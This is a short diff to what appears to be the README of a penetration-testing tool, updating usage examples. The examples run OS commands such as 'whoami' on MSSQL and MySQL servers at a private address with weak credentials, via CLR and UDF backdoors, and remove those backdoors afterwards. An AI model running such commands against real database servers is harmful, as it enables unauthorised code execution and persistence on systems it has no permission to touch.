@@ -153,7 +153,10 @@ cube sqlcmd -x mssql-com://172.16.157.163 -usa -p123456 -e "clear" //clear sp_oa
 
 
 cube sqlcmd -x mssql-clr://172.16.157.163 -usa -p123456 -e "whoami"
-cube sqlcmd -x mssql-clr://172.16.157.163 -usa -p123456 -e "close" //close CLR
+cube sqlcmd -x mssql-clr://172.16.157.163 -usa -p123456 -e "clear" //clear CLR
+
+cube sqlcmd -x mysql://172.16.157.163 -uroot -p123456 -e "whoami"
+cube sqlcmd -x mysql://172.16.157.163 -uroot -p123456 -e "clear" //clear udf backdoor
 ```
 
 
